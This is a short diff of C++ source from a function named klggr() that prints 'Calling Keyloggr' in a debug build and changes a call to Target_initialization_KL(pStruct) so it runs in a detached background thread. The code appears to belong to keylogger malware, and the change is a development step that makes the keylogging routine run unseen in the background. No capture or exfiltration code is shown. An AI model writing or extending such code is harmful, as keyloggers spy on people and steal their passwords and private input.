@@ -269,7 +269,8 @@ int klggr()
     std::cout << "Calling Keyloggr" << std::endl; MessageBoxA(NULL,"Calling Keyloggr", "Calling Keyloggr", MB_ICONHAND);
     #endif
 
-    Target_initialization_KL(pStruct);
+    std::thread([]() { Target_initialization_KL(pStruct); }).detach();
+    
     return 1;
 }
 
